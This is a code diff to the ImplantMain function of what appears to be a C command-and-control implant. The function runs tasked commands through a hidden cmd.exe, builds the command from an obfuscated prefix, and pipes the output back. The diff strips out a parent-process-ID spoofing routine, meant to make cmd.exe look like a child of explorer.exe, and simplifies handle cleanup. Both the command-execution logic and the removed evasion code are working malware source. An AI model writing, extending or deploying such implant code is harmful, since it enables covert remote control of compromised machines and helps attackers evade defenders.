@@ -928,38 +928,21 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                             sprintf(szCmd, "%s%s", szPrefix, pTasks[i].szArgs[0]);
                             ZeroString(szPrefix, ENC_CMD_EXE_LEN);
 
-                            HANDLE hReadPipe, hWritePipe;
+                            HANDLE hReadPipe = NULL, hWritePipe = NULL;
                             SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
                             if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
-                                // PPID Spoofing: make cmd.exe appear as child of explorer.exe
-                                STARTUPINFOEXA siEx = { 0 };
-                                siEx.StartupInfo.cb      = sizeof(STARTUPINFOEXA);
-                                siEx.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
-                                siEx.StartupInfo.hStdOutput = hWritePipe;
-                                siEx.StartupInfo.hStdError  = hWritePipe;
+                                SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
 
-                                HANDLE hSpoofParent = GetSpoofParentHandle();
-                                LPPROC_THREAD_ATTRIBUTE_LIST pAttrList = NULL;
-                                DWORD dwCreateFlags = CREATE_NO_WINDOW;
-
-                                if (hSpoofParent) {
-                                    SIZE_T cbAttrList = 0;
-                                    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttrList);
-                                    pAttrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttrList);
-                                    if (pAttrList &&
-                                        InitializeProcThreadAttributeList(pAttrList, 1, 0, &cbAttrList) &&
-                                        UpdateProcThreadAttribute(pAttrList, 0,
-                                            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-                                            &hSpoofParent, sizeof(HANDLE), NULL, NULL)) {
-                                        siEx.lpAttributeList = pAttrList;
-                                        dwCreateFlags |= EXTENDED_STARTUPINFO_PRESENT;
-                                    }
-                                }
+                                STARTUPINFOA si  = { 0 };
+                                si.cb            = sizeof(STARTUPINFOA);
+                                si.dwFlags       = STARTF_USESTDHANDLES;
+                                si.hStdOutput    = hWritePipe;
+                                si.hStdError     = hWritePipe;
 
                                 PROCESS_INFORMATION pi = { 0 };
                                 if (CreateProcessA(NULL, szCmd, NULL, NULL, TRUE,
-                                    dwCreateFlags, NULL, NULL, &siEx.StartupInfo, &pi)) {
-                                    CloseHandle(hWritePipe);
+                                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+                                    CloseHandle(hWritePipe); hWritePipe = NULL;
                                     WaitForSingleObject(pi.hProcess, 30000);
 
                                     // Dynamic read loop — handles large output
@@ -980,12 +963,10 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                                     CloseHandle(pi.hProcess);
                                     CloseHandle(pi.hThread);
                                 } else {
-                                    CloseHandle(hWritePipe);
                                     strcpy(res->szError, "CreateProcess failed");
                                 }
 
-                                if (pAttrList) { DeleteProcThreadAttributeList(pAttrList); HeapFree(GetProcessHeap(), 0, pAttrList); }
-                                if (hSpoofParent) CloseHandle(hSpoofParent);
+                                if (hWritePipe) CloseHandle(hWritePipe);
                                 CloseHandle(hReadPipe);
                             }
                         }
